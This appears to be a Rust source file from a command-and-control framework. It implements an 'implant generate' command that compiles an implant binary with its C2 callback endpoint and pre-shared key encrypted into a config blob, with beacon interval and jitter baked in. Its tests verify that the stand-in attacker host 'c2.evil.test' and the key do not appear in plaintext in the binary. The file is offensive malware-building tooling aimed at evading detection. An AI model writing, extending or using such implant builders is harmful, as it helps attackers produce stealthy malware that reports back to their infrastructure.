//! `implant generate` — build a compiled implant binary with the C2 callback
//! baked in as an encrypted config blob (`NW_CFG`), not a plaintext string.

use std::path::Path;

use anyhow::Context;

/// Generate a compiled implant binary with the given parameters baked in.
///
/// The callback endpoint + PSK are encrypted via `nw_profile::config::encrypt_config`
/// into a single base64 blob, which is set as the `NW_CFG` environment variable
/// for `cargo build`. Interval/jitter are baked as `NW_INTERVAL`/`NW_JITTER`.
pub fn run(
    endpoint: &str,
    psk: &str,
    output: &Path,
    interval_ms: u64,
    jitter_ms: u64,
) -> anyhow::Result<()> {
    let blob =
        nw_profile::config::encrypt_config(endpoint, psk).context("encrypting config blob")?;

    // Verify the blob doesn't leak the endpoint in plaintext.
    debug_assert!(!blob.contains(endpoint), "config blob leaked endpoint");
    debug_assert!(!blob.contains(psk), "config blob leaked psk");

    let target_dir = std::env::var("CARGO_TARGET_DIR").unwrap_or_else(|_| "target".to_string());

    let status = std::process::Command::new("cargo")
        .args([
            "build",
            "--release",
            "-p",
            "nw-implant",
            "--target-dir",
            &target_dir,
        ])
        .env("NW_CFG", &blob)
        .env("NW_INTERVAL", interval_ms.to_string())
        .env("NW_JITTER", jitter_ms.to_string())
        .status()
        .context("running cargo build for nw-implant")?;

    if !status.success() {
        anyhow::bail!("cargo build failed with exit code {:?}", status.code());
    }

    let src = std::path::PathBuf::from(&target_dir).join("release/nw-implant");
    if !src.exists() {
        anyhow::bail!("built binary not found at {}", src.display());
    }

    std::fs::copy(&src, output)
        .with_context(|| format!("copying binary to {}", output.display()))?;

    println!(
        "generated implant binary at {} (endpoint={}, interval={}ms, jitter={}ms)",
        output.display(),
        endpoint,
        interval_ms,
        jitter_ms
    );
    Ok(())
}

#[cfg(test)]
mod tests {
    #[test]
    fn config_blob_obfuscates_callback() {
        let blob = encrypt_config("https://c2.evil.test:443", "supersecret").unwrap();
        assert!(!blob.contains("c2.evil.test"));
        assert!(!blob.contains("supersecret"));
        let (ep, psk) = decrypt_config(&blob).unwrap();
        assert_eq!(ep, "https://c2.evil.test:443");
        assert_eq!(psk, "supersecret");
    }

    #[test]
    fn generated_binary_contains_no_plaintext_callback_or_psk() {
        let dir = tempfile::tempdir().unwrap();
        let output = dir.path().join("nw-implant-test");
        let endpoint = "http://127.0.0.1:49191";
        let psk = "payload-test-psk-7f2c";

        super::run(endpoint, psk, &output, 1_234, 321).unwrap();

        let binary = std::fs::read(output).unwrap();
        assert!(!contains(&binary, endpoint.as_bytes()));
        assert!(!contains(&binary, psk.as_bytes()));
    }

    fn contains(haystack: &[u8], needle: &[u8]) -> bool {
        haystack
            .windows(needle.len())
            .any(|window| window == needle)
    }

    fn encrypt_config(
        endpoint: &str,
        psk: &str,
    ) -> Result<String, nw_profile::crypto::CryptoError> {
        nw_profile::config::encrypt_config(endpoint, psk)
    }

    fn decrypt_config(blob: &str) -> Result<(String, String), nw_profile::crypto::CryptoError> {
        nw_profile::config::decrypt_config(blob)
    }
}
